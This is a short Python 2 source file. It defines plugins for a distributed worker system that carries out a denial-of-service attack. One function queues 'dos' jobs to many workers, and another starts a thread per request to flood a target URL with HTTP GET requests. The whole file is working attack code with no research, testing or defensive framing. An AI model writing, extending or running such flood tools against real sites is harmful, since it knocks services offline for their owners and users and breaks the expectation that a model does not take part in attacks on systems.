from utils.work_distributer.requester import RefreshRequester
from utils.work_distributer import Worker
from threading import Thread
from requests import get


def dos_distribute(url, times, workers, *args, **kwargs):
    requester = RefreshRequester('worker_queue')
    data = {
        "url": url,
        "times": times,
        "action": "dos",
        "plugin": "dos"
    }

    def f(requester, data, *args, **kwargs):
        requester.block_request(data)

    for _ in range(workers):
        Worker(f, requester, data, None).start()

    return {"status": "initiated"}


def dos_work(url, times, *args, **kwargs):

    def f(url):
        get(url)

    for _ in range(times):
        print "a"
        Thread(target=f, args=(url,)).start()

    return {"status": "success"}

class DosRefresherPlugin(object):
    ACTIONS = {"dos": dos_distribute}


class DosWorkerPlugin(object):
    ACTIONS = {"dos": dos_work}


REFRESHER_PLUGIN = DosRefresherPlugin

WORKER_PLUGIN = DosWorkerPlugin
